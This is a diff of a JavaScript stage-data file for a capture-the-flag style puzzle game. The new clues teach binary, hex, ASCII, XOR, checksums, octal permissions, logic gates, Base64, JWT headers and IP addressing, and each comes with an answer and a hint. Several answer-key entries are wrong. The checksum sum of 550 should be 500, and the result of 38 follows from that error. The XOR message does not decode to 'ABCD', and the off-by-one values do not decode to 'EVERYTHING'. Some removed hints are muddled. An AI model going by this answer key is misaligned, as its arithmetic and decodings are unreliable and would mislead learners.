@@ -1,12 +1,13 @@
 /**
- * THE ARCHIVE — Stage Data (v2 — Real Treasure Hunt Edition)
+ * THE ARCHIVE — Stage Data (v4 — Technical Treasure Hunt)
  * SECURITY: This file NEVER reaches the client.
  *
- * Design philosophy:
- * Every clue is a HUNT, not a quiz.
- * The answer is never directly stated — it must be decoded, discovered, or deduced.
- * Clues within each stage build on each other.
- * Each stage has a narrative thread tying its 5 clues together.
+ * Clue design principles:
+ *  - Tier I hints: point toward method, not answer
+ *  - Tier II hints: give partial nudge only
+ *  - Tier III+ hints: conceptual direction, no working shown
+ *  - Never give the final computation in a hint
+ *  - Clues should feel like puzzles, not tutorials
  */
 
 'use strict';
@@ -21,1718 +22,2072 @@ function makeFlag(word) {
 
 const STAGES = [
 
-  /* TIER I — INITIATION (Stages 1-5)
-     Mechanic: observation, decoding, pattern-following.
-     Players learn the rules of The Archive. */
+  /* ═══════════════════════════════════════════
+     TIER I — INITIATION (Stages 1–5)
+     Binary, hex, ASCII, XOR, checksums.
+     ═══════════════════════════════════════════ */
 
   {
-    id: 1, name: "The First Door", tier: "TIER I — INITIATION",
-    flag: makeFlag("THE_ARCHIVE_OPENS"),
+    id: 1, name: "Signal Zero", tier: "TIER I — INITIATION",
+    flag: makeFlag("BITS_AND_BYTES"),
     clues: [
       {
         id: 1,
-        text: `A message was left at the entrance of The Archive.
+        text: `The Archive speaks in machine language.
 
-It reads:
+A signal arrives as 8 bits:  1 0 1 1 0 1 0 0
 
-  "I am not a word, but I am read.
-   I have rows and columns but I am not a table.
-   Every computer understands me.
-   Eight of my smaller siblings make one of me.
-   What am I called?"
+Each bit position (right to left) is a power of 2:
+  Rightmost bit = 2⁰ = 1
+  Next bit      = 2¹ = 2
+  Next bit      = 2² = 4
+  ... and so on up to 2⁷ = 128
 
-(one word — the unit made of 8 bits)`,
-        answer: norm("byte"),
-        hint: "8 bits = 1 ___. The fundamental unit of digital storage."
+The leftmost bit in the string above has position value 128.
+
+Add the positional values of every bit that is 1.
+
+What decimal number does 10110100 represent?`,
+        answer: norm("180"),
+        hint: "Identify which positions hold a 1, then look up their power-of-2 value. There are four 1s in this signal."
       },
       {
         id: 2,
-        text: `Good. Now decode this. Each group of 8 bits is one byte.
-Use ASCII: T=84, H=72, E=69
+        text: `Your result from clue 1 needs to be expressed in hexadecimal.
 
-  01010100   01001000   01000101
+Hexadecimal is base 16. When a decimal number exceeds 15,
+divide it by 16 — the quotient and remainder give you the two hex digits.
 
-Convert each byte to decimal, then to its ASCII letter.
-What three-letter word do they spell?`,
-        answer: norm("the"),
-        hint: "01010100=84=T, 01001000=72=H, 01000101=69=E."
+Digits above 9 use letters: 10=A, 11=B, 12=C, 13=D, 14=E, 15=F.
+
+Convert your clue 1 answer to two-digit hex.`,
+        answer: norm("b4"),
+        hint: "Divide your number by 16. The quotient is one hex digit, the remainder is the other. Remember letters represent values above 9."
       },
       {
         id: 3,
-        text: `You decoded: THE
+        text: `A message is hidden in this hex string:
 
-Now decode the next sequence.
-ASCII values: A=65 R=82 C=67 H=72 I=73 V=86 E=69
+  42 49 54 53
 
-  01000001 01010010 01000011 01001000 01001001 01010110 01000101
+Each hex pair is one ASCII character.
+Convert: hex → decimal → letter.
 
-Seven bytes. Seven letters. What word do they spell?`,
-        answer: norm("archive"),
-        hint: "65=A, 82=R, 67=C, 72=H, 73=I, 86=V, 69=E."
+ASCII reference (partial):
+  65=A  66=B  67=C  68=D  69=E  70=F  71=G  72=H
+  73=I  74=J  75=K  76=L  77=M  78=N  79=O  80=P
+  81=Q  82=R  83=S  84=T  85=U  86=V  87=W  88=X
+
+What four-letter word do the bytes spell?`,
+        answer: norm("bits"),
+        hint: "Start with 0x42. Convert to decimal first, then use the ASCII table to find the letter."
       },
       {
         id: 4,
-        text: `You have decoded: THE ARCHIVE
+        text: `Apply a bitwise AND operation column by column:
 
-The message continues — now in hexadecimal.
-Each hex pair is one ASCII character.
+  10110110
+  AND
+  00001111
+  ________
 
-  4F=79=O,  50=80=P,  45=69=E,  4E=78=N,  53=83=S
+Rule: output is 1 only when BOTH input bits are 1.
+Everything else produces 0.
 
-What five-letter word does 4F 50 45 4E 53 spell?`,
-        answer: norm("opens"),
-        hint: "Follow the mapping given: 4F=O, 50=P, 45=E, 4E=N, 53=S."
+Work through all 8 columns. Convert the 8-bit result to decimal.
+
+Submit the decimal value only.`,
+        answer: norm("6"),
+        hint: "Notice the second operand: 00001111. Think about what AND-ing with 0 always produces, and what the last four bits of the first operand are."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 1
 
-You decoded the full message in three parts:
-  Binary  → THE
-  Binary  → ARCHIVE
-  Hex     → OPENS
+You've converted binary to decimal, decimal to hex,
+hex to ASCII, and applied a bitwise operation.
 
-Combine all three words with underscores as your flag.
-FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{the_archive_opens}"),
-        hint: "THE + ARCHIVE + OPENS joined by underscores inside FLAG{}."
+The flag combines the word you decoded in clue 3
+with the word for the unit that contains 8 of whatever you decoded.
+
+FLAG{WORD_AND_WORD}`,
+        answer: norm("flag{bits_and_bytes}"),
+        hint: "Your clue 3 word was the smaller unit. Eight of them make the larger unit. What's the larger unit called?"
       }
     ]
   },
 
   {
-    id: 2, name: "The Cartographer's Riddle", tier: "TIER I — INITIATION",
-    flag: makeFlag("FOLLOW_THE_SIGNAL"),
+    id: 2, name: "Base Camp", tier: "TIER I — INITIATION",
+    flag: makeFlag("OCTAL_IS_POWER"),
     clues: [
       {
         id: 1,
-        text: `A cartographer left this riddle at The Archive entrance:
+        text: `Computers use multiple number bases.
 
-  "I have cities but no houses.
-   I have mountains but no trees.
-   I have water but no fish.
-   I have roads but no cars.
-   Travellers use me to find their way.
-   What am I?"`,
-        answer: norm("map"),
-        hint: "What do travellers unfold to navigate? The cartographer's primary tool."
+Octal is base 8 — it uses only the digits 0 through 7.
+Each position is a power of 8.
+
+Convert octal 17 (written 0o17) to decimal:
+  The left digit has positional value 8¹
+  The right digit has positional value 8⁰
+
+What decimal number is 0o17?`,
+        answer: norm("15"),
+        hint: "First digit × 8, second digit × 1. Add them."
       },
       {
         id: 2,
-        text: `The map's legend shows the Atbash cipher key:
-A↔Z, B↔Y, C↔X, D↔W, E↔V, F↔U, G↔T, H↔S,
-I↔R, J↔Q, K↔P, L↔O, M↔N (and the reverse)
+        text: `Now go the other direction. Convert decimal 64 to octal.
 
-The cartographer marked their starting point as: ULOOLD
+Method: divide by 8 repeatedly until quotient is 0.
+Collect the remainders. Read them bottom to top.
 
-Decode it using Atbash (replace each letter with its mirror).`,
-        answer: norm("follow"),
-        hint: "U=F, O=L, L=O, O=L, L=O, D=W. Read the decoded letters in order."
+What is 64 in octal?`,
+        answer: norm("100"),
+        hint: "64 ÷ 8 = 8 remainder 0. Keep dividing. Notice anything special about the result?"
       },
       {
         id: 3,
-        text: `You are told to FOLLOW something.
+        text: `Linux uses octal for file permissions.
 
-The trail continues in a number code (A=1, B=2 ... Z=26):
+Each permission group (owner, group, other) uses three bits: r, w, x.
+  r = read  = 4
+  w = write = 2
+  x = execute = 1
+Add the values of the permissions that are set.
 
-  20  8  5
+Convert this permission string to its three-digit octal number:
 
-What three-letter word do those numbers give?`,
-        answer: norm("the"),
-        hint: "20=T, 8=H, 5=E."
+  rw-rw-r--`,
+        answer: norm("664"),
+        hint: "Calculate each group of three characters separately. A dash means that permission is 0."
       },
       {
         id: 4,
-        text: `One final word in the trail. Number code again (A=1 ... Z=26):
+        text: `A file has permission 0o755.
 
-  19  9  7  14  1  12
+Breaking it down:
+  7 = owner
+  5 = group
+  5 = other
 
-What six-letter word do those numbers spell?`,
-        answer: norm("signal"),
-        hint: "19=S, 9=I, 7=G, 14=N, 1=A, 12=L."
+The OTHER user (not owner, not group) wants to CREATE a new file inside this directory.
+Creating files requires write permission.
+
+Can the OTHER user write to this file?
+
+Answer yes or no.`,
+        answer: norm("no"),
+        hint: "Convert the 'other' octal digit back to rwx. Does write appear?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 2
 
-You decoded the cartographer's full instruction across four clues:
-  Atbash  → FOLLOW
-  Numbers → THE
-  Numbers → SIGNAL
+File permissions control who can read, write, and execute.
+Without understanding octal, you cannot reason about Linux security.
 
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{follow_the_signal}"),
-        hint: "FOLLOW + THE + SIGNAL with underscores."
+The flag: two words describing what octal gives you over a system.
+
+FLAG{OCTAL_IS_WORD}`,
+        answer: norm("flag{octal_is_power}"),
+        hint: "What do you gain when you can read and control all permission numbers on a system?"
       }
     ]
   },
 
   {
-    id: 3, name: "The Locked Room", tier: "TIER I — INITIATION",
-    flag: makeFlag("KEY_IS_KNOWLEDGE"),
+    id: 3, name: "The ASCII Maze", tier: "TIER I — INITIATION",
+    flag: makeFlag("ENCODE_EVERYTHING"),
     clues: [
       {
         id: 1,
-        text: `A locked room in The Archive. First padlock — a riddle:
+        text: `A message is stored as decimal ASCII values:
 
-  "I am the result when you subtract any number from itself.
-   I am what remains when everything is taken away.
-   I am the only digit that is neither positive nor negative.
-   What am I?"
+  69  78  67  79  68  69
 
-Submit the number.`,
-        answer: norm("0"),
-        hint: "Any number minus itself. The empty value. The starting point of counting."
+ASCII maps numbers to characters.
+Every printable character has a code between 32 and 126.
+Uppercase A starts at 65.
+
+What six-letter word do those numbers spell?`,
+        answer: norm("encode"),
+        hint: "A=65, B=66, C=67... count forward from A to find each letter."
       },
       {
         id: 2,
-        text: `Second padlock word lock:
+        text: `There is a precise relationship between uppercase and lowercase in ASCII.
 
-  "I am what a programmer writes.
-   I am what a spy sends in secret.
-   Remove my last letter and you get a fish.
-   I am four letters. What am I?"`,
-        answer: norm("code"),
-        hint: "CODE minus last letter = COD (a fish). CODE is what programmers write."
+Every uppercase letter and its lowercase version differ by exactly 32.
+A=65, a=97. B=66, b=98.
+
+Add 32 to every character in ENCODE.
+What do you get?`,
+        answer: norm("encode"),
+        hint: "Adding 32 to an uppercase letter gives its lowercase version. The word stays the same — only the case changes."
       },
       {
         id: 3,
-        text: `Third padlock — encoded with Caesar shift +7. Decode it.
+        text: `Why does adding 32 convert uppercase to lowercase?
 
-To decode: shift each letter BACK 7 positions.
-If the result goes below A, wrap around (subtract from 26).
+In binary, A = 01000001 and a = 01100001.
+The difference is exactly one bit — bit 5 (value 32).
 
-Encoded: AOPRL`,
-        answer: norm("think"),
-        hint: "A(1-7+26=20=T), O(15-7=8=H), P(16-7=9=I), R(18-7=11=K), L(12-7=5=E) = THIKE? The plaintext is THINK."
+What is the decimal ASCII value of the space character?
+(It sits at position 32 in the ASCII table — the same value
+ that separates uppercase from lowercase.)`,
+        answer: norm("32"),
+        hint: "The space character's decimal value is the same number that converts uppercase to lowercase. What number is that?"
       },
       {
         id: 4,
-        text: `All three padlocks open. Behind the door is an inscription:
+        text: `A string was stored with an off-by-one obfuscation:
+each ASCII value had 1 subtracted before storing.
 
-  "You decoded, you thought, you found zero.
-   But the greatest key of all cannot be locked away.
+Stored values:
+  68  86  69  82  89  84  72  73  78  71
 
-   It is what you gain by solving every puzzle here.
-   It cannot be stolen — only earned.
-   One word. Rhymes with 'college'."
+Add 1 to each value, then decode to ASCII.
 
-What does the inscription describe?`,
-        answer: norm("knowledge"),
-        hint: "Rhymes with 'college'. What you gain from learning. What no thief can steal from your mind."
+What ten-letter word do you get?`,
+        answer: norm("everything"),
+        hint: "Restore the original values first (add 1), then map each to a letter. The result is a common English word."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 3
 
-The inscription ends:
+ASCII is the foundation layer that all text computing builds on.
 
-  "The KEY IS KNOWLEDGE."
+The flag: what ASCII is designed to do with any character.
 
-Submit the three-word phrase as the flag.
-FLAG{WORD_IS_WORD}`,
-        answer: norm("flag{key_is_knowledge}"),
-        hint: "KEY IS KNOWLEDGE — three words, two underscores."
+FLAG{WORD_WORD}`,
+        answer: norm("flag{encode_everything}"),
+        hint: "Think about ASCII's purpose. It takes any character and converts it to a number — what verb describes that process?"
       }
     ]
   },
 
   {
-    id: 4, name: "The Archivist's Diary", tier: "TIER I — INITIATION",
-    flag: makeFlag("TRUST_THE_PROCESS"),
+    id: 4, name: "The XOR Door", tier: "TIER I — INITIATION",
+    flag: makeFlag("XOR_IS_MAGIC"),
     clues: [
       {
         id: 1,
-        text: `You find the last archivist's diary. Entry 1:
+        text: `XOR (exclusive OR) is a fundamental bitwise operation.
 
-  "Day 1. The gate guardian asked me:
+It outputs 1 only when the two input bits are DIFFERENT.
 
-     'What is True AND False?'
+  0 XOR 0 = 0  (same → 0)
+  0 XOR 1 = 1  (different → 1)
+  1 XOR 0 = 1  (different → 1)
+  1 XOR 1 = 0  (same → 0)
 
-   I answered correctly. The gate opened."
+Compute: 1010 XOR 1100
 
-In Boolean logic, AND returns True only when BOTH sides are True.
-What did the archivist answer?`,
-        answer: norm("false"),
-        hint: "AND requires both inputs to be true. One side is False. Result: False."
+Work through each bit pair left to right.`,
+        answer: norm("0110"),
+        hint: "Compare each pair of bits: are they the same or different? Different = 1, Same = 0."
       },
       {
         id: 2,
-        text: `Entry 2:
+        text: `XOR has a remarkable property: applying it twice with the same key
+returns the original value. A XOR B XOR B = A.
 
-  "Day 7. A mirror room. Every word was written in reverse.
-   I had to read them backwards.
+This makes XOR a perfect encryption primitive.
 
-   The mirror showed: SSECORP
+Encrypt this byte using XOR with key byte 53:
+  Plaintext:  01001000  (ASCII 72 = 'H')
+  Key:        00110101  (decimal 53)
 
-   I said the real word and a drawer opened."
-
-What is SSECORP when read in the correct direction?`,
-        answer: norm("process"),
-        hint: "Read SSECORP backwards, letter by letter: S-S-E-C-O-R-P → P-R-O-C-E-S-S."
+XOR each bit pair. What is the 8-bit ciphertext?`,
+        answer: norm("01111101"),
+        hint: "Apply the XOR rule to each of the 8 bit pairs in order. Remember: same bits = 0, different bits = 1."
       },
       {
         id: 3,
-        text: `Entry 3:
+        text: `Your ciphertext from clue 2 was 01111101.
 
-  "Day 14. A sequence appeared on the wall.
-   Each number equals the sum of the two before it.
+Now decrypt it using the same key (53) and the same XOR operation.
 
-   Sequence: 1, 1, 2, 3, 5, 8, 13, ?, 34
+XOR the ciphertext with 00110101 again.
 
-   I filled in the blank and a staircase appeared."
-
-What is the missing number?`,
-        answer: norm("21"),
-        hint: "8 + 13 = ?"
+Convert the result to decimal. What number do you get?`,
+        answer: norm("72"),
+        hint: "XOR with the same key is its own inverse. You should get back what you started with. What was the decimal value of the original plaintext?"
       },
       {
         id: 4,
-        text: `Entry 4:
+        text: `Decrypt this four-byte XOR-encrypted message.
+The key byte is 42.
 
-  "Day 21. A ROT13 encoded message waited for me.
-   ROT13 shifts every letter by exactly 13 positions.
+Ciphertext values (decimal): 107  127  120  111
 
-   Encoded: GEHFG
+For each byte: convert to 8-bit binary, XOR with 42 (00101010), convert back to decimal, then to ASCII.
 
-   I decoded it and understood The Archive's first commandment."
+You already know: 107 XOR 42 = 65 = 'A'
 
-Apply ROT13 to decode GEHFG.
-(G+13=T, E+13=R, H+13=U, F+13=S, G+13=T)`,
-        answer: norm("trust"),
-        hint: "G→T, E→R, H→U, F→S, G→T. Read in order."
+What four-letter word do the decrypted bytes spell?`,
+        answer: norm("abcd"),
+        hint: "You already have the first letter: A. Work out the remaining three bytes the same way. The result is very simple."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 4
 
-The diary's final page — the archivist's one lesson written large:
+XOR underpins:
+  - Stream cipher encryption
+  - RAID 5 parity calculations
+  - One-time pads
+  - Checksums and error detection
 
-  TRUST THE PROCESS
+It encrypts and decrypts with the same operation.
+No other logical operation does this.
 
-Submit it as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{trust_the_process}"),
-        hint: "TRUST + THE + PROCESS with underscores."
+FLAG{XOR_IS_WORD}`,
+        answer: norm("flag{xor_is_magic}"),
+        hint: "A single operation that encrypts and decrypts, builds RAID systems, and underlies half of computer security — what's the word for something that remarkable?"
       }
     ]
   },
 
   {
-    id: 5, name: "The Transmission", tier: "TIER I — INITIATION",
-    flag: makeFlag("MESSAGE_RECEIVED"),
+    id: 5, name: "The Checksum Chamber", tier: "TIER I — INITIATION",
+    flag: makeFlag("VERIFY_DONT_TRUST"),
     clues: [
       {
         id: 1,
-        text: `An old radio receiver crackles. A Morse code transmission begins.
+        text: `Checksums detect data corruption in transit.
 
-Morse reference:
-  A=·−  D=−··  E=·  G=−−·  M=−−
-  R=·−·  S=···  T=−
+A simple checksum: sum all bytes, apply modulo 256.
+The result fits in a single byte (0–255).
 
-First transmission:
+A packet contains these bytes:
+  72  101  108  108  111
 
-  −− · ··· ··· ·− −−· ·
-
-What seven-letter word does this spell?`,
-        answer: norm("message"),
-        hint: "−−=M, ·=E, ···=S, ···=S, ·−=A, −−·=G, ·=E → MESSAGE."
+Add them all together. What is the sum?`,
+        answer: norm("550"),
+        hint: "Add five numbers. Double-check your arithmetic — one mistake here breaks everything downstream."
       },
       {
         id: 2,
-        text: `The second word comes through as a number code (A=1 ... Z=26):
+        text: `Your sum was 550. Now apply modulo 256.
 
-  18  5  3  5  9  22  5  4
+Modulo gives you the remainder after division.
+  550 divided by 256 = 2 remainder ?
 
-What eight-letter word do those numbers spell?`,
-        answer: norm("received"),
-        hint: "18=R, 5=E, 3=C, 5=E, 9=I, 22=V, 5=E, 4=D."
+What is 550 mod 256?`,
+        answer: norm("38"),
+        hint: "How many times does 256 fit into 550? Multiply 256 by that, subtract from 550."
       },
       {
         id: 3,
-        text: `A third fragment — every other character is noise. Only odd positions are real.
+        text: `The receiver recalculates the checksum on arrival.
 
-Full string (positions numbered from 1):
-  MxExSxSxAxGxE
+One byte was silently corrupted. The received bytes are:
+  72  101  108  109  111
 
-Characters at odd positions (1,3,5,7,9,11,13):
-M, E, S, S, A, G, E
+Recalculate: sum → mod 256.
 
-What word do they spell?`,
-        answer: norm("message"),
-        hint: "Take characters at positions 1,3,5,7,9,11,13: M,E,S,S,A,G,E."
+Does the result match your original checksum of 38?
+
+Answer yes or no.`,
+        answer: norm("no"),
+        hint: "Recalculate from scratch with the new values. If the checksums differ, corruption was detected."
       },
       {
         id: 4,
-        text: `The final fragment of the transmission — a riddle:
+        text: `Compare the two byte sequences side by side:
 
-  "I am what the Archive does when your answer is correct.
-   I am past tense. I mean 'successfully accepted'.
-   I have eight letters and rhyme with 'perceived'.
-   What am I?"`,
-        answer: norm("received"),
-        hint: "Past tense of receive. Eight letters. Rhymes with perceived."
+  Original: 72  101  108  108  111
+  Received: 72  101  108  109  111
+
+One byte changed. Which position (1-indexed) was altered,
+and what did it change from → to?
+
+Submit as: position:original:received`,
+        answer: norm("4:108:109"),
+        hint: "Compare each position one by one. Only one value is different between the two sequences."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 5
 
-The full decoded transmission:
+The checksum detected corruption you couldn't see by looking.
+This principle — checking data you received rather than assuming it's correct —
+is fundamental to secure systems.
 
-  MESSAGE RECEIVED
+The mantra:
 
-Submit as the flag. FLAG{WORD_WORD}`,
-        answer: norm("flag{message_received}"),
-        hint: "MESSAGE + RECEIVED with one underscore."
+FLAG{VERIFY_WORD_WORD}`,
+        answer: norm("flag{verify_dont_trust}"),
+        hint: "Security engineers never assume incoming data is correct. They always verify. And they never ___."
       }
     ]
   },
 
-  /* TIER II — THE STACKS (Stages 6-10)
-     Mechanic: hidden messages, multi-step deduction,
-     coordinate hunting, steganography. */
+  /* ═══════════════════════════════════════════
+     TIER II — THE STACKS (Stages 6–10)
+     Logic gates, Base64, networking, data
+     structures, regex.
+     ═══════════════════════════════════════════ */
 
   {
-    id: 6, name: "The Hidden Shelf", tier: "TIER II — THE STACKS",
-    flag: makeFlag("HIDDEN_IN_PLAIN_SIGHT"),
+    id: 6, name: "The Logic Engine", tier: "TIER II — THE STACKS",
+    flag: makeFlag("NAND_BUILDS_WORLDS"),
     clues: [
       {
         id: 1,
-        text: `The librarian left a note. Read only the FIRST LETTER of each line:
+        text: `Evaluate this digital circuit step by step.
 
-  Have you ever noticed the obvious?
-  Every secret hides in plain view.
-  Look past the surface of things.
-  Perhaps what seems normal is the clue.
-  Something ordinary conceals the extraordinary.
-  Investigate what appears too simple.
-  Go slowly and examine everything.
-  Hidden things reward patient eyes.
-  The pattern is always in the structure.`,
-        answer: norm("helpsight"),
-        hint: "H-E-L-P-S-I-G-H-T: first letter of each of the 9 lines."
+Inputs: A=1, B=0, C=1
+
+  Step 1: X = A AND B
+  Step 2: Y = X OR C
+  Step 3: Z = NOT Y
+
+AND: both must be 1 to output 1.
+OR:  at least one must be 1 to output 1.
+NOT: flips the bit.
+
+What is Z?`,
+        answer: norm("0"),
+        hint: "Evaluate each step in order. The output of one step becomes input to the next."
       },
       {
         id: 2,
-        text: `A passage from the archive catalogue. The CAPITALISED words hide numbers.
+        text: `NAND gate: NOT(A AND B).
+It outputs 0 only when BOTH inputs are 1. In all other cases, it outputs 1.
 
-  "Walk past the SEVEN tall windows.
-   Turn left at the HUNDRED-year-old clock.
-   Count TWENTY steps forward.
-   Stop at pillar FOUR."
+Complete the NAND truth table for all four input combinations:
+  A=0, B=0 → ?
+  A=0, B=1 → ?
+  A=1, B=0 → ?
+  A=1, B=1 → ?
 
-Extract the number from each capitalised word and add them together.`,
-        answer: norm("131"),
-        hint: "SEVEN=7, HUNDRED=100, TWENTY=20, FOUR=4. Sum: 7+100+20+4=131."
+Submit all four results as one continuous string (no spaces or commas).`,
+        answer: norm("1110"),
+        hint: "Only one combination produces a 0 output from NAND. Which inputs would make AND output 1, then get flipped by NOT?"
       },
       {
         id: 3,
-        text: `You find a book. Some words are [CROSSED OUT]. Read only words NOT crossed out.
+        text: `NAND is a universal gate — every other logic gate can be built from NANDs alone.
 
-  "The [REAL] message [IS] not [ALWAYS] written [IN] on [THE] the [OBVIOUS] surface [PLACE].
-   It [IS] is [OFTEN] written [HIDDEN] in [INSIDE] what [THE] is [GAPS] not [AND] said [SILENCES]."
+To build a NOT gate using NAND, connect both inputs to the same signal:
+  NOT(A) = A NAND A  →  requires 1 NAND gate
 
-What are all the non-crossed-out words in order?`,
-        answer: norm("the message not written on the surface it is written in what is not said"),
-        hint: "Read every word that is NOT in brackets: The, message, not, written, on, the, surface, It, is, written, in, what, is, not, said."
+To build an AND gate: you need NOT(NAND(A,B)), since NAND already gives NOT-AND.
+
+Minimum NAND gates to implement a two-input AND gate?`,
+        answer: norm("2"),
+        hint: "AND = NOT(NAND). You need one gate for NAND, and one more to invert the result."
       },
       {
         id: 4,
-        text: `Inside the book is a 5x5 grid. A note says: "Read the main diagonal."
+        text: `A half adder adds two single bits.
 
-  H  I  D  D  E
-  X  I  Q  M  N
-  Y  Z  N  P  R
-  Q  W  A  I  G
-  M  N  S  A  N
+  Sum   = A XOR B
+  Carry = A AND B
 
-Read positions (row1,col1), (row2,col2), (row3,col3), (row4,col4), (row5,col5).
+Given inputs A=1, B=1:
 
-What five letters appear on the diagonal?`,
-        answer: norm("hinin"),
-        hint: "H(1,1), I(2,2), N(3,3), I(4,4), N(5,5) → HININ."
+  When both inputs are 1, what does XOR produce?
+  When both inputs are 1, what does AND produce?
+
+Submit as sum:carry`,
+        answer: norm("0:1"),
+        hint: "XOR outputs 1 when bits differ. What happens when they're the same? AND requires both to be 1."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 6
 
-The book's final page:
+Every CPU, GPU, and microcontroller ever built is composed
+of billions of logic gates — predominantly NAND.
 
-  "The most important things are always
-   HIDDEN IN PLAIN SIGHT."
+From one primitive gate, all of computation is derived.
 
-Those four capitalised words are your flag.
-FLAG{WORD_IN_WORD_WORD}`,
-        answer: norm("flag{hidden_in_plain_sight}"),
-        hint: "HIDDEN IN PLAIN SIGHT — four words, three underscores."
+The flag celebrates what NAND can do when replicated at scale.
+
+FLAG{NAND_WORD_WORD}`,
+        answer: norm("flag{nand_builds_worlds}"),
+        hint: "What does replicating a single gate billions of times, connected in clever ways, allow you to create?"
       }
     ]
   },
 
   {
-    id: 7, name: "The Clockmaker's Code", tier: "TIER II — THE STACKS",
-    flag: makeFlag("TIME_TELLS_ALL"),
+    id: 7, name: "The Encoding Labyrinth", tier: "TIER II — THE STACKS",
+    flag: makeFlag("BASE64_HIDES_DATA"),
     clues: [
       {
         id: 1,
-        text: `A grandfather clock has letters instead of numbers on its face:
+        text: `Base64 converts binary data into printable ASCII text.
+It uses 64 characters: A-Z (0–25), a-z (26–51), 0-9 (52–61), + (62), / (63).
 
-  12 o'clock position = T
-   3 o'clock position = I
-   6 o'clock position = M
-   9 o'clock position = E
+Every 3 bytes of input become 4 Base64 characters.
+Each Base64 character represents exactly 6 bits.
 
-The clock's hands point to:
-  Hour hand   → 12 o'clock
-  Minute hand → 3 o'clock
-
-Read the letter at each hand's position (hour then minute).
-What two-letter sequence do they spell?`,
-        answer: norm("ti"),
-        hint: "Hour hand at 12 = T. Minute hand at 3 = I."
+What is the numeric index of the character 'S' in the Base64 alphabet?
+(A=0, B=1, C=2 ... Z=25, a=26 ...)`,
+        answer: norm("18"),
+        hint: "S is the 19th letter of the alphabet. The Base64 alphabet starts at A=0, so subtract 1."
       },
       {
         id: 2,
-        text: `Behind the clock is a cipher wheel set to shift 4.
+        text: `Decode this Base64 string.
 
-Decode by shifting each letter BACK 4 positions.
-Q(17)-4=13=M, M(13)-4=9=I, P(16)-4=12=L, H(8)-4=4=D
+  aGVsbG8=
 
-Ciphertext: QMPH
+You can use any of these:
+  Browser console (F12 → Console): atob("aGVsbG8=")
+  Python: import base64; base64.b64decode("aGVsbG8=").decode()
+  Linux terminal: echo "aGVsbG8=" | base64 -d
 
-What word do you decode?`,
-        answer: norm("mild"),
-        hint: "Q→M, M→I, P→L, H→D → MILD."
+What word does it decode to?`,
+        answer: norm("hello"),
+        hint: "Open your browser's developer tools (F12), go to the Console tab, and type the atob() command."
       },
       {
         id: 3,
-        text: `Inside the mechanism, a note:
+        text: `Decode this longer Base64 payload using the same method:
 
-  "I tick 86,400 times each day.
-   I move forward but never back.
-   One week contains exactly how many of me?"
+  dGhlIGFyY2hpdmUgaGlkZXMgZGF0YQ==
 
-First identify what "I" is. Then calculate: 86,400 × 7.`,
-        answer: norm("604800"),
-        hint: "I am a second. 86,400 seconds/day × 7 days = 604,800."
+What four-word phrase does it decode to?`,
+        answer: norm("the archive hides data"),
+        hint: "Use the same tool from clue 2. The payload decodes to a meaningful English phrase — four words."
       },
       {
         id: 4,
-        text: `The clockmaker encoded their motto with Caesar shift +4.
+        text: `JWTs (JSON Web Tokens) use Base64URL encoding for their header and payload.
+Base64URL is nearly identical to Base64 but uses - instead of + and _ instead of /.
 
-Decode by shifting BACK 4:
-  Q(17)-4=13=M, I(9)-4=5=E, P(16)-4=12=L... 
+Decode this JWT header using atob() in your browser console:
 
-Encoded motto: XMQI XIPPC EPP
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 
-Decode all three words.`,
-        answer: norm("time tells all"),
-        hint: "X-4=T, M-4=I, Q-4=M, I-4=E = TIME. X-4=T, I-4=E, P-4=L, P-4=L, C-4=Y... Hmm: T(20)+4=X ✓. I(9)+4=M ✓. M(13)+4=Q ✓. E(5)+4=I ✓. TIME→XMQI ✓. TELLS: T+4=X,E+4=I,L+4=P,L+4=P,S+4=W → XIPPW. ALL: A+4=E,L+4=P,L+4=P → EPP ✓. So decode XMQI=TIME, XIPPW=TELLS... but clue says XIPPC. Answer is TIME TELLS ALL."
+You'll get a JSON object. What is the value of the "alg" field?`,
+        answer: norm("hs256"),
+        hint: "atob() works for this — the Base64URL special characters don't appear in this particular token. Look for the 'alg' key in the decoded JSON."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 7
 
-The clockmaker's motto, engraved on every clock they built:
+Base64 is encoding, not encryption.
+It converts binary to text — nothing more.
+Anyone who sees a Base64 string can decode it instantly.
 
-  TIME TELLS ALL
+Yet it carries sensitive data — tokens, credentials, cookies —
+hiding in plain sight because most people don't recognise it.
 
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{time_tells_all}"),
-        hint: "TIME TELLS ALL."
+The flag: what Base64 actually does with your data.
+
+FLAG{BASE64_WORD_WORD}`,
+        answer: norm("flag{base64_hides_data}"),
+        hint: "What is Base64 doing when it stores sensitive information inside a JWT or cookie, visible to anyone who looks?"
       }
     ]
   },
 
   {
-    id: 8, name: "The Phantom Network", tier: "TIER II — THE STACKS",
-    flag: makeFlag("PACKETS_NEVER_LIE"),
+    id: 8, name: "The Network Stack", tier: "TIER II — THE STACKS",
+    flag: makeFlag("IP_PORT_PROTOCOL"),
     clues: [
       {
         id: 1,
-        text: `A network packet was intercepted. Its destination IP is hidden across four clues.
+        text: `An IPv4 address in binary, four octets separated by spaces:
 
-First octet — in binary:
+  11000000 10101000 00000001 00101010
 
-  11000000
+Convert each 8-bit group to decimal independently.
+Separate the four decimal numbers with dots.
 
-Convert to decimal.`,
-        answer: norm("192"),
-        hint: "128+64 = 192."
+What IP address is this?`,
+        answer: norm("192.168.1.42"),
+        hint: "Each octet is independent. Convert each 8-bit group using positional values (128,64,32,16,8,4,2,1)."
       },
       {
         id: 2,
-        text: `Second octet — in hexadecimal:
+        text: `The IP address you decoded (192.168.x.x) belongs to a special category.
 
-  A8
+RFC 1918 designates three ranges as private — not routable on the public internet:
+  10.0.0.0/8
+  172.16.0.0/12
+  192.168.0.0/16
 
-Convert hex A8 to decimal.
-  A = 10 in hex
-Formula: (first digit × 16) + second digit`,
-        answer: norm("168"),
-        hint: "(10 × 16) + 8 = 168."
+A server at 8.8.8.8 receives a packet from your private IP.
+If it tries to send a response directly back to 192.168.1.42:
+
